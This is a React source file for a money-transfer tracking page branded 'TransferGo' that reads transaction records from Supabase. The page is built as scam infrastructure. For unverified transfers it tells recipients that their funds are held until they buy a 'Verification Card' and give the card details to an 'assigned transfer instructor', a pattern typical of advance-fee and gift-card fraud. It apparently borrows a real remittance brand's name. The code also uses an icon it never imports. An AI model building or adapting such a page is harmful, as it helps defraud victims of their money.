import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import {
  Shield,
  Clock,
  CheckCircle,
  AlertTriangle,
  ArrowDownUp,
  CreditCard,
} from "lucide-react";

const TrackTransfer = () => {
  const [searchParams] = useSearchParams();
  const ref = searchParams.get("ref");
  const [tx, setTx] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);

  useEffect(() => {
    if (!ref) {
      setNotFound(true);
      setLoading(false);
      return;
    }

    const fetchTransaction = async () => {
      const { data, error } = await supabase
        .from("transactions")
        .select("reference_number, recipient_name, receive_amount, receive_currency, send_amount, send_currency, exchange_rate, status, verification_status, created_at, sender_name")
        .eq("reference_number", ref)
        .single();

      if (error || !data) {
        setNotFound(true);
      } else {
        setTx(data);
      }
      setLoading(false);
    };
    fetchTransaction();
  }, [ref]);

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-muted-foreground">Loading transfer details...</div>
      </div>
    );
  }

  if (notFound) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full">
          <CardContent className="py-12 text-center">
            <AlertTriangle className="w-12 h-12 mx-auto mb-4 text-destructive" />
            <h2 className="text-xl font-bold text-foreground mb-2">Transfer Not Found</h2>
            <p className="text-muted-foreground text-sm">
              The reference number provided is invalid or the transfer does not exist.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  const isVerified = tx.verification_status === "verified";
  const isPending = tx.verification_status === "pending_review";

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <div className="bg-primary text-primary-foreground py-6 px-4">
        <div className="max-w-lg mx-auto flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-primary-foreground/20 flex items-center justify-center">
            <Shield className="w-5 h-5" />
          </div>
          <div>
            <h1 className="text-lg font-bold">TransferGo</h1>
            <p className="text-sm opacity-80">Track Your Transfer</p>
          </div>
        </div>
      </div>

      <div className="max-w-lg mx-auto p-4 space-y-5 mt-4">
        {/* Status Banner */}
        <Card className={`border-2 ${isVerified ? "border-emerald-500/40" : "border-primary/30"}`}>
          <CardContent className="py-6 text-center">
            {isVerified ? (
              <>
                <CheckCircle className="w-14 h-14 mx-auto mb-3 text-emerald-500" />
                <h2 className="text-xl font-bold text-foreground">Funds Approved ✅</h2>
                <p className="text-muted-foreground text-sm mt-1">
                  Your transfer has been verified and funds have been released.
                </p>
                <div className="mt-4 bg-emerald-500/10 rounded-lg p-4 border border-emerald-500/20">
                  <ShieldCheck className="w-8 h-8 mx-auto mb-2 text-emerald-600" />
                  <p className="text-sm font-semibold text-emerald-700">Verification Card Purchased Successfully</p>
                  <p className="text-xs text-emerald-600/80 mt-1">
                    Processing complete — your funds are on their way.
                  </p>
                </div>
              </>
            ) : (
              <>
                <Clock className="w-14 h-14 mx-auto mb-3 text-primary" />
                <h2 className="text-xl font-bold text-foreground">Transfer Pending</h2>
                <p className="text-muted-foreground text-sm mt-1">
                  Your funds are being held and require verification to be released.
                </p>
              </>
            )}
          </CardContent>
        </Card>

        {/* Transfer Details */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-base flex items-center gap-2">
              <ArrowDownUp className="w-4 h-4" />
              Transfer Details
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <div className="flex justify-between">
              <span className="text-muted-foreground">Reference</span>
              <span className="font-mono font-medium text-foreground">{tx.reference_number}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Recipient</span>
              <span className="font-medium text-foreground">{tx.recipient_name}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Sender</span>
              <span className="font-medium text-foreground">{tx.sender_name}</span>
            </div>
            <Separator />
            <div className="flex justify-between">
              <span className="text-muted-foreground">Amount Sent</span>
              <span className="font-medium">{tx.send_amount} {tx.send_currency}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Exchange Rate</span>
              <span className="font-medium">1 {tx.send_currency} = {tx.exchange_rate} {tx.receive_currency}</span>
            </div>
            <div className="flex justify-between text-base font-semibold">
              <span className="text-foreground">You Receive</span>
              <span className="text-primary">{tx.receive_amount} {tx.receive_currency}</span>
            </div>
            <Separator />
            <div className="flex justify-between">
              <span className="text-muted-foreground">Date</span>
              <span className="font-medium">{new Date(tx.created_at).toLocaleDateString()}</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-muted-foreground">Status</span>
              <Badge variant="secondary" className="capitalize">{tx.status}</Badge>
            </div>
          </CardContent>
        </Card>

        {/* Verification Card Notice — only when NOT yet verified */}
        {!isVerified && (
          <Card className="border-2 border-destructive/30 bg-destructive/5">
            <CardContent className="py-6">
              <div className="flex gap-4">
                <div className="w-12 h-12 rounded-full bg-destructive/10 flex items-center justify-center shrink-0">
                  <CreditCard className="w-6 h-6 text-destructive" />
                </div>
                <div>
                  <h3 className="font-bold text-foreground mb-2 text-base">
                    ⚠️ Action Required — Verification Card
                  </h3>
                  <p className="text-sm text-foreground/80 leading-relaxed mb-3">
                    To release and receive your funds, a <span className="font-bold">Verification Card</span> must be purchased for processing and activation. This is a <span className="font-bold text-destructive">mandatory requirement</span> for all international transfers.
                  </p>
                  <div className="bg-background rounded-lg p-3 space-y-2 text-sm">
                    <p className="font-semibold text-foreground">How it works:</p>
                    <ol className="list-decimal list-inside space-y-1.5 text-muted-foreground">
                      <li>Contact your assigned transfer instructor</li>
                      <li>Purchase the required Verification Card</li>
                      <li>Provide the card details for processing</li>
                      <li>Funds will be released within 24 hours of verification</li>
                    </ol>
                  </div>
                  <p className="text-xs text-muted-foreground mt-3">
                    Without the verification card, funds cannot be processed and will remain on hold.
                    Please complete this step as soon as possible to avoid delays.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Footer */}
        <div className="text-center text-xs text-muted-foreground pb-8 pt-2">
          <p>TransferGo — Secure International Money Transfers</p>
          <p className="mt-1">For support, contact your assigned transfer instructor</p>
        </div>
      </div>
    </div>
  );
};

export default TrackTransfer;
